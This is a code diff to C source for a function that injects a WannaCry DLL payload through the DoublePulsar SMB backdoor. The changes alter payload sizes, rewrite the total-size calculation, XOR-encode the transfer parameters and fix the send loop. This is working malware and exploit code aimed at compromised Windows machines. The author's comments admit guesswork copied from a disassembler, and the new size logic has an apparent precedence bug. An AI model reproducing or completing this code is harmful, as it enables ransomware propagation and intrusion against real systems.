@@ -231,24 +231,27 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 	if(architectureType)
 	{
 		//32 bits
+		Payload = &hDLL_x86;
 		shellcode_payload_size = 0x1305; //decimal: 4869
-		DLLSize = 0x4060;
-		DLLPayload = &hDLL_x86;
+		PayloadSize = 0x50D800;
 	}
 	else
 	{
 		//64 bits
+		Payload = &hDLL_x64;
 		shellcode_payload_size = 0x1800; //decimal: 6144
-		DLLSize = 0xc8a4;
-		DLLPayload = &hDLL_x64;
+		PayloadSize = 0x50D800;
 	}
-	HGLOBAL hMem = GlobalAlloc(GMEM_ZEROINIT, shellcode_payload_size + DLLSize + 12);
+	
+	//removed the 12 from the hMem size
+	HGLOBAL hMem = GlobalAlloc(GMEM_ZEROINIT, shellcode_payload_size + PayloadSize);
 	
 	//could be wrong but copied from IDA
 	//looks like the DLL is added to the hMem location right after the runDLL shellcode
-	memcpy(hMem + shellcode_payload_size, DLLPayload, DLLSize);
+	memcpy(hMem + shellcode_payload_size, Payload, PayloadSize);
 	
 	//not sure what is going on here, but looks like the total_size is getting populated here
+	/* Kept for historical purposes but most likely WRONG
 	if (&DLLPayload[shellcode_payload_size] % 4)
 	{
 		 total_size = 4 * ((signed int)DLLPayload[shellcode_payload_size] / 4) + 4;
@@ -256,8 +259,13 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 	else
 	{
 		total_size = DLLPayload[shellcode_payload_size];
+	}*/
+	if ( PayloadSize + shellcode_payload_size % 4) {
+		total_size = 4 * ((5298176 + 6144) / 4) + 4;
 	}
-	//end.  This code block is most likely bugged until this is fixed
+	else {
+		total_size = 0x50D800 + 0x1800;
+	}
 	
 	if(architectureType)
 	{
@@ -294,16 +302,16 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 	
 	//the payload size doesn't change, but this is determined by the shellcode + DLL payload
 	//change this to dynamically change based on the size of the payload
-	unsigned int xor_payload_size = 0x507308 ^ xkey; 
+	unsigned int xor_payload_size = total_size ^ xkey; 
 	unsigned int chunk_size = 4096 ^ xkey; //chunk size but encrypted with XOR key
 	unsigned int o_offset = 0 ^ xkey; //offset counter but encrypted with XOR key
-	unsigned int bytesLeft = (shellcode_payload_size + DLLSize); //Bytes Left counter
+	unsigned int bytesLeft = total_size; //Bytes Left counter
 	//WILL verify why wannacry in IDA says: shellcode_payload_size + DLLSize + 12
 	//OR use this:
 	//unsigned int bytesLeft = sizeof(hMem)/sizeof(hMem[0]);
 	if(total_size / 4096 > 0)
 	{
-		for(i=0; ctx=i)
+		for(i=0; ; ctx=i)
 		{
 			o_offset = ctx ^ xkey;
 			memcpy(Parametersbuffer, (char*)&xor_payload_size, 4);
